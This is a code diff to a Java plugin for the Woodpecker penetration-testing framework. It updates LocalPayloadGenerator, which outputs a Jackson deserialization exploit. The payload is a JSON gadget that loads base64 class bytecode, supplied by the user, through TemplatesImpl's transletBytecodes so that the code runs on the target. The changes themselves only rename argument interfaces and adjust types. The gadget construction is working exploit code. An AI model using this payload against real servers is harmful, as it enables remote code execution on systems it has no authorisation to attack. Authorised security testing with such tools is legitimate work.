@@ -1,6 +1,6 @@
 package me.gv7.woodpecker.vuldb.payload;
 
-import me.gv7.woodpecker.plugin.IArgs;
+import me.gv7.woodpecker.plugin.IArg;
 import me.gv7.woodpecker.plugin.IArgsUsageBinder;
 import me.gv7.woodpecker.plugin.IPayloadGenerator;
 import me.gv7.woodpecker.plugin.IResultOutput;
@@ -18,8 +18,8 @@ public class LocalPayloadGenerator implements IPayloadGenerator {
 
     public IArgsUsageBinder getPayloadCustomArgs() {
         IArgsUsageBinder argsUsageBinder = JacksonVulPlugin.pluginHelper.createArgsUsageBinder();
-        List<IArgs> args = new ArrayList<IArgs>();
-        IArgs args1 = JacksonVulPlugin.pluginHelper.createArgs();
+        List<IArg> args = new ArrayList<IArg>();
+        IArg args1 = JacksonVulPlugin.pluginHelper.createArg();
         args1.setName("class_base64");
         args1.setDefaultValue("yv66vgAAADE...");
         args1.setDescription("要执行的class字节码base64编码数据");
@@ -30,8 +30,8 @@ public class LocalPayloadGenerator implements IPayloadGenerator {
     }
 
     @Override
-    public void generatorPayload(Map<String, String> customArgs, IResultOutput iResultOutput) {
-        String base64Class = customArgs.get("class_base64");
+    public void generatorPayload(Map<String, Object> customArgs, IResultOutput iResultOutput) {
+        String base64Class = (String)customArgs.get("class_base64");
         iResultOutput.successPrintln("Relying on the JDK");
         String payload1 = String.format("{\"obj\":[\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",{\"transletBytecodes\":[\"%s\" ],\"transletName\":\"a.b\", \"outputProperties\":{}}]}",base64Class);
         iResultOutput.rawPrintln(payload1);
